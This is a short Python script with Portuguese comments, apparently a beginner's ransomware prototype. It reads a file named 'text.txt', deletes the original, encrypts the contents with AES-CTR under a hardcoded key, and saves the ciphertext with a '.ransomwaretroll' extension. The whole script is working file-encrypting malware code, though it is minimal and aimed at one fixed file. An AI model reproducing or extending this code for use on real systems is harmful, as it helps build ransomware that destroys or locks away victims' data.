import os
import pyaes 

legible_file_name = "text.txt"
file = open(legible_file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(legible_file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = "text.txt.ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()